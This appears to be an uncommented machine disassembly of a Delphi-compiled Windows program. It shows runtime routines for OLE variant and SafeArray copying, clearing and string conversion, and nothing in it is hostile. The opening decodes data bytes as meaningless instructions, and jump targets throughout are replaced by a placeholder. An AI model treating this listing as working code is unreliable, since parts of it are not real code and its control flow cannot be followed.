retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
xor eax eax
push ebp
dec ebp
in al 0x8b
mov ebx eax
popad
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
jb r-xdata
push 0x0
xor eax eax
push ebp
push sub_40e1be
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
inc ebp
jb r-xdata
loope r-xdata
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e0 ] dl
add [ eax ] al
add [ eax - 0x4bffbf8a ] bh
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
outsd
push sub_40e257
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40feb8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40feb8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e25e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fe0
retn
jb r-xdata
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ eax ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
outsd
jb r-xdata
dec ecx
inc eax
add ah al
fild [ eax ]
add [ eax ] al
add [ edx + esi ] al
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
jb r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
rcr [ edi + ebx * 8 + 0x40 ] 0x0
add [ eax ] al
jb r-xdata
popad
jns r-xdata
outsb
js r-xdata
les esi [ eax + eax * 2 ]
popad
push esi
popad
jb r-xdata
add [ eax ] al
jb r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
add [ edx + esi ] al
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
fild [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
outsd
jb r-xdata
jo r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fiadd [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
jb r-xdata
inc ebp
sub_40e174
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e1be
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1c5
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40e1c8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e257
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40feb8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40feb8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e25e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fe0
retn
sub_40e264
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e2ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e2b5
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40e2b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e347
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40feb8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40feb8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e34e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fe0
retn
sub_40e354
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e39e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e3a5
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40e3a8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e5ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5f4
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403fe0
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
dec eax
je r-xdata
call sub_40e174
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
jmp r-xdata
call sub_40e264
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ac0c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
jmp r-xdata
jmp r-xdata
sub_40e608
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e1c8
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e2b8
jmp r-xdata
jmp r-xdata
call sub_40e3a8
sub_40e63c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e686
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e68d
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40e6a4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e6d4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e6d4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e730
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e5fc
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e5fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e6a4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e5fc
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e5fc
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e6d4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e5fc
mov eax [ ebp - 0x314 ]
call sub_40e928
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e8ac
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e5fc
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403fbc
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410314
test al al
je r-xdata
mov eax ebx
call sub_40e730
jmp r-xdata
push ebx
call VariantClear
call sub_40e5fc
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e944
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e974
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e974
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e9d0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e5fc
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e5fc
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e928
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e354
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e5fc
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e5fc
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e944
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e974
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e5fc
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e5fc
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eba4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e8ac
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e5fc
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404010
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410314
test al al
je r-xdata
mov ecx sub_40eb9c
mov edx esi
mov eax ebx
call sub_40e9d0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e5fc
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40ec50
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40eba4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e8ac
sub_40ec94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40469c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e608
pop ebx
pop ebp
retn 0x8
sub_40eccc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40469c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e608
pop ebx
pop ebp
retn 0x8
sub_40ed04
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40edba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40469c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e608
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edc1
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fe0
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404244
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407b88
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4047e8
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404244
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407b4c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4047e8
jmp r-xdata
jmp r-xdata
call sub_40e264
sub_40edc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ee87
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ee65
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e608
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4047ac
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404898
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404244
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee6c
lea eax [ ebp - 0x10 ]
call sub_40e928
retn
sub_40ee94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40eeea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40ec50
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40ef7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eef1
lea eax [ ebp - 0x10 ]
call sub_40e928
retn
sub_40eef8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410314
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ef6d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_404010
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e928
retn
sub_40ef7c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f4b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40efb5 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404010
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403fbc
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404010
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e9c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404010
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4092c0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404010
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4092c0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404010
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ec94
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404244
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40eccc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404244
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4047ac
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404898
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404244
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
